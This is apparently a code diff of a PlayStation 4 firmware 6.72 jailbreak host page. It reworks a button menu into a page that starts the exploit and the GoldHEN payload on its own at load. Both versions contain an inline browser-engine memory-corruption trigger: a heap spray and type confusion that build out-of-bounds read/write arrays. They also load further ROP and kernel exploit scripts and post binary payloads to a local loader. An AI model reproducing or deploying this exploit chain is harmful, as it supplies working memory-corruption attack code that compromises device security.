@@ -1,398 +1,207 @@
-<!DOCTYPE html>
 <html manifest="cache.manifest">
 <head>
-<meta charset="UTF-8" />
-<title>PS4 6.72 Exploit Menu</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style type="text/css">
-    * {
-        box-sizing: border-box;
-        margin: 0;
-        padding: 0;
-    }
-    
-    body {
-        background-color: #121212;
-        font-family: Helvetica, Arial, sans-serif;
-        font-size: 16px;
-        color: #e0e0e0;
-        text-align: center;
-        line-height: 1.34;
-        background-image: linear-gradient(to bottom, #0a0a0a, #1a1a1a);
-        min-height: 100vh;
-        margin: 0;
-    }
-    
-    .container {
-        max-width: 1200px;
-        margin: 0 auto;
-        padding: 20px;
-    }
-    
-    .header {
-        background-color: #0d1b2a;
-        padding: 20px 20px;
-        border-radius: 8px 8px 0 0;
-        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.5), 0 1px 3px rgba(0, 0, 0, 0.8);
-        margin-top: 10px;
-		margin-bottom: 30px;
-        border-bottom: 1px solid #1e3a5f;
-    }
-    
-    .header h1 {
-        color: #4cc9f0;
-        font-size: 30px;
-        font-weight: bold;
-        text-shadow: 0 0 8px rgba(76, 201, 240, 0.5);
-    }
-    
-    .card {
-        background-color: #1e1e1e;
-        border-radius: 8px;
-        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.5), 0 1px 3px rgba(0, 0, 0, 0.8);
-        margin-bottom: 16px;
-		margin-top: 10px;
-        padding: 25px 25px;
-		min-height: 200px;
-        text-align: center;
-        border: 1px solid #2d2d2d;
-        transition: transform 0.3s, box-shadow 0.3s;
-    }
-    
-    .card:hover {
-        transform: translateY(-3px);
-        box-shadow: 0 7px 14px rgba(0, 0, 0, 0.7), 0 3px 6px rgba(0, 0, 0, 0.9);
-    }
-    
-    .card h2 {
-        color: #4cc9f0;
-        font-size: 28px;
-        margin-bottom: 15px;
-        border-bottom: 1px solid #2d2d2d;
-        padding-bottom: 10px;
-        text-shadow: 0 0 5px rgba(76, 201, 240, 0.3);
-    }
-    
-    .button-group {
-        display: flex;
-        flex-wrap: wrap;
-        justify-content: center;
-    }
-    
-    .button-group button {
-        margin: 5px; 
-    }
-    
-    button {
-        background-color: #1e3a5f;
-        border: none;
-        border-radius: 6px;
-        color: white;
-        font-size: 17px;
-        padding: 12px 20px;
-        font-weight: bold;
-        cursor: pointer;
-        transition: background-color 0.2s, transform 0.1s, box-shadow 0.2s;
-        flex: 1;
-        min-width: 200px;
-        max-width: 280px;
-        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);
-        position: relative;
-        overflow: hidden;
-    }
-    
-    button::before {
-        content: '';
-        position: absolute;
-        top: 0;
-        left: -100%;
-        width: 100%;
-        height: 100%;
-        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
-        transition: left 0.5s;
-    }
-    
-    button:hover::before {
-        left: 100%;
-    }
-    
-    button:hover {
-        background-color: #2a4d7a;
-        transform: translateY(-2px);
-        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.6);
-    }
-    
-    button:active {
-        transform: translateY(0);
-    }
-    
-    .secondary {
-        background-color: #2d5b2d;
-    }
-    
-    .secondary:hover {
-        background-color: #3a753a;
-    }
-    
-    .tertiary {
-        background-color: #5d4037;
-    }
-    
-    .tertiary:hover {
-        background-color: #6d4c41;
-    }
-    
-    .status-message {
-        background-color: #1a1a1a;
-        padding: 24px;
-        border-radius: 6px;
-        margin: 20px 0;
-        font-size: 20px;
-        color: #e0e0e0;
-        border-left: 4px solid #4cc9f0;
-        min-height: 60px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.5);
-    }
-    
-    .status-message h1 {
-        font-size: 28px;
-        color: #4cc9f0;
-        margin: 0;
-        text-shadow: 0 0 5px rgba(76, 201, 240, 0.3);
-    }
-    
-    .divider {
-        height: 1px;
-        background: linear-gradient(to right, transparent, #4cc9f0, transparent);
-        margin: 20px 0;
-    }
-    
-    .footer {
-        margin-top: 20px;
-        color: #5a5a5a;
-        font-size: 14px;
-        text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
-    }
-    
-    /* Toggle Switch Styles */
-    .toggle-container {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin-top: 15px;
-        gap: 10px;
-    }
-    
-    .toggle-label {
-        font-size: 14px;
-        color: #e0e0e0;
-    }
-    
-    .toggle-switch {
-        position: relative;
-        display: inline-block;
-        width: 50px;
-        height: 24px;
-    }
-    
-    .toggle-switch input {
-        opacity: 0;
-        width: 0;
-        height: 0;
-    }
-    
-    .toggle-slider {
-        position: absolute;
-        cursor: pointer;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        background-color: #2d2d2d;
-        transition: .4s;
-        border-radius: 24px;
-    }
-    
-    .toggle-slider:before {
-        position: absolute;
-        content: "";
-        height: 18px;
-        width: 18px;
-        left: 3px;
-        bottom: 3px;
-        background-color: white;
-        transition: .4s;
-        border-radius: 50%;
-    }
-    
-    input:checked + .toggle-slider {
-        background-color: #4cc9f0;
-    }
-    
-    input:checked + .toggle-slider:before {
-        transform: translateX(26px);
-    }
-    
-    @media (max-width: 768px) {
-        .button-group {
+    <meta charset="UTF-8" />
+    <title>PS4 6.72 GoldHEN</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
             flex-direction: column;
+            justify-content: center;
             align-items: center;
+            overflow: hidden;
         }
         
-        button {
-            width: 100%;
-            max-width: 100%;
+        #msgs {
+            font-size: 38px;
+            text-align: center;
+            margin: 20px 0;
+            text-shadow: 0 0 10px rgba(0, 150, 255, 0.7);
+            position: relative;
+            z-index: 2;
         }
-    }
-</style>
-<script>
-var leaker_obj = {a: 0}; var leaker_arr = new Uint32Array(6); var oob_slave = new Uint8Array(1024); var oob_master = new Uint32Array(7); var spray = []; for(var i = 0; i < 0x8000; i++) { var x = new Uint32Array(1); x[spray.length+'spray'] = 123; spray.push(x); } var target = {a: 2.1100820415101592e-303, b: false, c: true, d: 5678}; var target2 = {a: 2.1100820415101592e-303, b: false, c: true, e: 5678}; var impl_idx = 0; var prop_cache = []; for(var i = 0; i < 32; i++) { prop_cache[i] = i + 'x'; } function create_impl() { var ans = {a: target}; var empty_obj = {}; for(var i = 0; i < 32; i++) ans[prop_cache[i]] = empty_obj; return ans; } function trigger(x) { if(impl.a !== target) { return; } var o = {a: 1}; for(var i in o) { { i = x; function i(){} } o[i]; } if(impl.a === target) return; print(typeof (impl.a)); print(impl.a.length); target.c = leaker_obj; leaker_obj.a = leaker_obj; var l1 = impl.a[4]; var l2 = impl.a[5]; leaker_obj.a = oob_slave; var s1 = impl.a[4]; var s2 = impl.a[5]; target.c = leaker_arr; impl.a[4] = l1; impl.a[5] = l2; target.c = oob_master; impl.a[4] = s1; impl.a[5] = s2; impl.a = target; print([l1, l2, s1, s2]); } try { var max_iterations = 512; for(var _ = 0; _ < max_iterations; _++) { var impl = create_impl(); var s = {a: impl}; trigger(s); } } catch(e) { }
+        
+        #console {
+            display: none;
+        }
+        
+        /* O loader continua definido para ser usado na mensagem inicial, se necessário */
+        .loader {
+            width: 125px;
+            height: 125px;
+            border: 10px solid rgba(255, 255, 255, 0.1);
+            border-top: 10px solid #4dabf7;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+            margin: 30px auto;
+            box-shadow: 0 0 30px rgba(77, 171, 247, 0.5);
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.8; }
+            50% { opacity: 1; }
+            100% { opacity: 0.8; }
+        }
+        
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            font-size: 20px;
+            color: rgba(255, 255, 255, 0.5);
+        }
+       
+    </style>
+    <script>
+        var leaker_obj = {a: 0}; 
+        var leaker_arr = new Uint32Array(6); 
+        var oob_slave = new Uint8Array(512); 
+        var oob_master = new Uint32Array(7); 
+        var spray = []; 
+        for(var i = 0; i < 0x8000; i++) { 
+            var x = new Uint32Array(1); 
+            x[spray.length+'spray'] = 123; 
+            spray.push(x); 
+        } 
+        var target = {a: 2.1100820415101592e-303, b: false, c: true, d: 5678}; 
+        var target2 = {a: 2.1100820415101592e-303, b: false, c: true, e: 5678}; 
+        var impl_idx = 0; 
+        var prop_cache = []; 
+        for(var i = 0; i < 32; i++) { 
+            prop_cache[i] = i + 'x'; 
+        } 
+        
+        function create_impl() { 
+            var ans = {a: target}; 
+            var empty_obj = {}; 
+            for(var i = 0; i < 32; i++) 
+                ans[prop_cache[i]] = empty_obj; 
+            return ans; 
+        } 
+        
+        function trigger(x) { 
+            if(impl.a !== target) { 
+                return; 
+            } 
+            var o = {a: 1}; 
+            for(var i in o) { 
+                { 
+                    i = x; 
+                    function i(){} 
+                } 
+                o[i]; 
+            } 
+            if(impl.a === target) 
+                return; 
+            print(typeof (impl.a)); 
+            print(impl.a.length); 
+            target.c = leaker_obj; 
+            leaker_obj.a = leaker_obj; 
+            var l1 = impl.a[4]; 
+            var l2 = impl.a[5]; 
+            leaker_obj.a = oob_slave; 
+            var s1 = impl.a[4]; 
+            var s2 = impl.a[5]; 
+            target.c = leaker_arr; 
+            impl.a[4] = l1; 
+            impl.a[5] = l2; 
+            target.c = oob_master; 
+            impl.a[4] = s1; 
+            impl.a[5] = s2; 
+            impl.a = target; 
+            print([l1, l2, s1, s2]); 
+        } 
+        
+        try { 
+            var max_iterations = 512; 
+            for(var _ = 0; _ < max_iterations; _++) { 
+                var impl = create_impl(); 
+                var s = {a: impl}; 
+                trigger(s); 
+            } 
+        } catch(e) { 
+        }
 
-window.applicationCache.ondownloading=function(){document.getElementById("progress").innerHTML="Page Caching Started!!"};
-window.applicationCache.onprogress=function(a){document.getElementById("progress").innerHTML="Caching Status: "+(Math.round(100*(a.loaded/a.total)))+"% Completed"};
-window.applicationCache.oncached=function(){document.getElementById("progress").innerHTML="Page Cached Successfully!!";setTimeout(function(){document.getElementById("progress").innerHTML="Turn Off the Internet & Reopen the Browser!!"; }, 1500);};
-</script>
+        function CacheProgress(e){
+            const msgs = document.getElementById('msgs');
+            if (msgs) {
+                const Percent = (Math.round(e.loaded / e.total * 100));
+                msgs.innerHTML = "Installing Offline Cache: " + Percent + "%"; 
+            }
+        }
+        
+        function CachingDone(){
+            const msgs = document.getElementById('msgs');
+            setTimeout(function(){
+                localStorage.cached = "yes";
+                if (msgs) {
+                    msgs.innerHTML = "Cache Installed Successfully<br>Re-Open The Browser To Continue...";
+                }
+            }, 2000);
+        }
+        
+        window.applicationCache.addEventListener("progress",CacheProgress,false);
+        window.applicationCache.oncached=function(e){CachingDone();};
+        window.applicationCache.onnoupdate=function(){setTimeout(function(){jailbreak(); p.write8(0, 0);},200);};
+        window.applicationCache.onerror=function(){setTimeout(function(){jailbreak(); p.write8(0, 0);},200);};
+    </script>
 </head>
 <body>
-<div class="container">
-    <div class="header">
-        <h1>PS4 6.72 EXPLOIT MENU - 2025</h1>
+    <div id="msgs" class="pulse">
+        Loading GoldHEN ...
+        <div class="loader"></div> 
     </div>
-    <div class="status-message">
-        <h1 id="progress">Initialize</h1>
-    </div>
-        <div class="card">
-            <h2>GOLDHEN PAYLOADS</h2>
-			<br>
-            <div class="button-group">
-			    <button onclick="load_exploit(); return false">Load Exploit</button>
-                <button onclick="gold(); return false" class="secondary">Load GoldHEN 2.4b</button>
-            </div>
-            <div class="toggle-container">
-                <span class="toggle-label">Auto-load GoldHEN on page open:</span>
-                <label class="toggle-switch">
-                    <input type="checkbox" id="autoLoadToggle">
-                    <span class="toggle-slider"></span>
-                </label>
-            </div>
-        </div>
-        <div class="card">
-            <h2>PAYLOADS</h2>
-			<br>
-            <div class="button-group">
-                <button class="tertiary" onclick="loadPayload(payloadFiles.disableUpdates); return false">Disable Updates</button>
-            </div>
-        </div>
-		
-    <div class="footer">
-        PS4 6.72 Exploit Host - 2025 Edition
-    </div>
-</div>
-<script>
-let bigArray = null;
-function allocate() {
-   bigArray = new Array(1_800_000).fill(undefined);
-}
-</script>
-<script>
-let goldTimeoutId = null; 
+    <div class="footer">PS4 6.72 GoldHEN</div>
 
-function load_exploit() {
-    progress.innerHTML = "<div>Loading Exploit ...</div>";
-    try {
-        jailbreak();
-        p.write8(0, 0);
-    } finally {
-    }
-}
-
-function gold() {
-    progress.innerHTML="<div>Loading GoldHEN 2.4b ...</div>";
-    start_exploit();
-    start_exploit();
-    try {
-        stagegold();
-    } catch (e) {
-        alert(e);
-    }
-}    
-
-const payloadFiles = {
-    disableUpdates: "disableupdates.bin",
-};
-
-function getPayload(payload, onLoadEndCallback) {
-    const req = new XMLHttpRequest();
-    req.open("GET", payload);
-    req.responseType = "arraybuffer";
-    req.onload = (event) => onLoadEndCallback && onLoadEndCallback(req, event);
-    req.send();
-}
-
-function sendPayload(url, data, onLoadEndCallback) {
-    const req = new XMLHttpRequest();
-    req.open("POST", url, true);
-    req.onload = (event) => onLoadEndCallback && onLoadEndCallback(req, event);
-    req.send(data);
-}
-
-function loadPayload(file) {
-    const statusUrl = "http://127.0.0.1:9090/status";
-    const payloadUrl = "http://127.0.0.1:9090";
-    const req = new XMLHttpRequest();
-    req.open("POST", statusUrl);
-    req.onerror = () => alert("Cannot Load Payload Because The BinLoader Server Is Not Running");
-    req.onload = () => {
-      const responseJson = JSON.parse(req.responseText);
-      if (responseJson.status === "ready") {
-        getPayload(file, (req) => {
-          if ((req.status === 200 || req.status === 304) && req.response) {
-            sendPayload(payloadUrl, req.response, (req) => {
-              progress.innerHTML = req.status === 200 ? "Payload Loaded ✓" : "Cannot send payload";
-            });
-          }
-        });
-      } else {
-        alert("Cannot Load Payload Because The BinLoader Server Is Busy");
-      }
-    };
-    req.send();
-}
-
-function checkAutoLoad() {
-    if (localStorage.getItem('autoLoadGoldHEN') === 'true') {
-        document.getElementById('autoLoadToggle').checked = true;
-        setTimeout(load_exploit, 750);
-        goldTimeoutId = setTimeout(gold, 2250);
-    }
-}
-
-document.getElementById('autoLoadToggle').addEventListener('change', function() {
-    localStorage.setItem('autoLoadGoldHEN', this.checked);
-    if (this.checked) {
-        setTimeout(load_exploit, 750);
-        goldTimeoutId = setTimeout(gold, 2250);
-    } else {
-        if (goldTimeoutId) {
-            clearTimeout(goldTimeoutId);
-            goldTimeoutId = null;
+    <script src="./rop.js" defer></script>
+    <script src="./syscalls.js" defer></script>
+    <script src="./expl.js" defer></script>
+    <script src="./jb.js" defer></script>
+    <script src="./exploit.js" defer></script>
+    <script src="./goldhen.js" defer></script> 
+    <script>
+        let bigArray = null;
+        function allocate() {
+            bigArray = new Array(1_400_000).fill(undefined);
         }
-    }
-});
+    </script>
+    <script>
+        let startExploitCalled = false;
 
-window.addEventListener('DOMContentLoaded', checkAutoLoad);
-</script>
+        async function gold() {
+            const progress = document.getElementById('progress');
+            const msgs = document.getElementById('msgs');
 
-<script src="./rop.js" defer></script>
-<script src="./syscalls.js" defer></script>
-<script src="./expl.js" defer></script>
-<script src="./jb.js" defer></script>
-<script src="./exploit.js" defer></script>
-<script src="./goldhen.js" defer></script> 
-
-<pre id="console"></pre>
+            try {
+                if (!startExploitCalled) {
+                    await start_exploit();
+                    startExploitCalled = true;
+                }
+                await stagegold();
+                if (progress) {
+                    progress.innerHTML = '<div></div>'; 
+                }
+            } catch (e) {
+            }
+        }
+    </script>
+    <script>
+        window.addEventListener('load',function(){setTimeout(function(){if(typeof gold==='function'){gold();}},1300);});
+    </script>
+    <pre id="console"></pre>
 </body>
 </html>
